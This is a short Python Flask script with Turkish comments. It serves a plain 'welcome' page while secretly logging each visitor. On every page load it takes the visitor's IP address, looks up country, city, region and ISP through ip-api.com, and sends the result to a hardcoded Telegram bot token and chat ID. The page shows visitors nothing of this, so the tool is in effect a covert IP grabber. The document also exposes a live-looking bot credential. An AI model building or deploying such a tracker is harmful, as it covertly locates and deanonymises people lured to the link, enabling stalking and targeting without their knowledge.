from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# Telegram bilgileri
TELEGRAM_BOT_TOKEN = "7582934680:AAHEG81AacRXP3HlRNBNK4hjuaDd16xRj5U"
TELEGRAM_CHAT_ID = "5528443629"

# Basit HTML sayfa (kullanıcıya gösterilecek)
HTML_PAGE = """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Hoşgeldiniz</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      text-align: center;
      padding-top: 100px;
    }
    h1 {
      color: #333;
    }
    p {
      color: #555;
    }
  </style>
</head>
<body>
  <h1>Hoşgeldiniz!</h1>
  <p>Web sitemize giriş yaptınız. Keyifli gezintiler!</p>
</body>
</html>
"""

# Telegram'a mesaj gönderen fonksiyon
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    requests.post(url, data=data)

@app.route('/')
def index():
    # IP adresini al
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp,query")
        data = response.json()

        message = (
            "📥 Yeni Ziyaretçi!\n"
            f"🌐 IP: {data.get('query', 'Bilinmiyor')}\n"
            f"📍 Ülke: {data.get('country', '-')}\n"
            f"🏙️ Şehir: {data.get('city', '-')}\n"
            f"🗺️ Bölge: {data.get('regionName', '-')}\n"
            f"📡 ISP: {data.get('isp', '-')}"
        )
    except:
        message = f"⚠️ Yeni ziyaretçi geldi. IP: {ip}, detay alınamadı."

    # Telegram'a gönder
    send_to_telegram(message)

    # Kullanıcıya HTML sayfa döndür
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
